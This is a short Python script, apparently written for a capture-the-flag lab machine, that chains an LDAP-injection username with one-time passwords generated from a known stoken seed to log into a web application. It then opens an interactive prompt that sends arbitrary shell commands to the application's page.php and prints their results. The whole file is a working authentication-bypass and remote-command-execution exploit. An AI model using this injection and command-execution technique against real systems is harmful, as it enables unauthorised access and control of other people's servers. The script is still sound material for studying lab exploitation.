#!/usr/bin/env python3

import calendar
import re
import requests
import time
from cmd import Cmd
#from datetime import datetime
from subprocess import Popen, PIPE

class CTF_TERM(Cmd):
    prompt = "CTF> "

    def __init__(self, proxy=None):

        super().__init__()
        self.interval = 1.3
        self.seed = '285449490011357156531651545652335570713167411445727140604172141456711102716717000'
        self.s = requests.session()
        if proxy: self.s.proxies = proxy
        
        # Get Time From Box
        r = self.s.get('http://10.10.10.122/login.php')
        local = time.gmtime()
        server = time.strptime(r.headers['Date'], "%a, %d %b %Y %H:%M:%S %Z")
        self.offset = time.mktime(local) - time.mktime(server)

        # Login
        self.s.post('http://10.10.10.122/login.php',
                data = {"inputUsername": "ldapuser%29%29%29%00",
                        "inputOTP": self.get_otp()})
        

    def get_otp(self):
        process = Popen(['stoken', f'--token={self.seed}', f'--use-time=-{self.offset}', '--pin=0000'],
                stdout=PIPE)
        out,err = process.communicate()
        return out.decode().strip()


    def default(self, cmd):
        resp = self.s.post('http://10.10.10.122/page.php',
                data = {"inputCmd": cmd, "inputOTP": self.get_otp()})
        result = re.findall(r'<pre>(.*)</pre>', resp.text, re.DOTALL)
        if len(result) > 0:
            print(result[0].rstrip())

term = CTF_TERM(proxy={"http":"http://127.0.0.1:8080"})
try:
    term.cmdloop()
except KeyboardInterrupt:
    print()
